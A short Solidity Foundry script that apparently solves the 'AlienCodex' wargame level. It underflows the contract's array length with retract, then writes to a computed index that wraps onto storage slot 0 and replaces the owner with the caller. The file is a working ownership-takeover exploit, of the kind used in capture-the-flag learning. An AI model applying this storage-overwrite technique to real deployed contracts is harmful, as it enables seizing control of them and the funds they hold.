// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface AlienCodex {
    function owner() external view returns (address);
    function contact() external returns (bool);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexSol is Script {
    AlienCodex public ac_ = AlienCodex(0x36545B1Bd62eB1dF275B76c1040dc73B53Dbd55B);

    function run() external {
        vm.startBroadcast();
        
        console.log("Before Owner: ", ac_.owner());
        ac_.makeContact();
        ac_.retract();
        ac_.revise(~(uint256(keccak256(abi.encode(0x1)))) + 1, bytes32(uint256(uint160(msg.sender))));
        console.log("After Owner:  ", ac_.owner());

        vm.stopBroadcast();
    }
}